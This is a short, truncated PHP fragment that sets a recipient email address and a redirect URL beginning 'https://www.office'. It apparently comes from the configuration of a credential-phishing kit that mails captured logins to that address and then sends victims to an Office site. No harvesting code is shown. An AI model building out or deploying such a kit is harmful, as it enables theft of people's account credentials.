<?php
$receivedEmail = 'FrankHiggins097@outlook.com'; // Your email address
$redirect = 'https://www.office';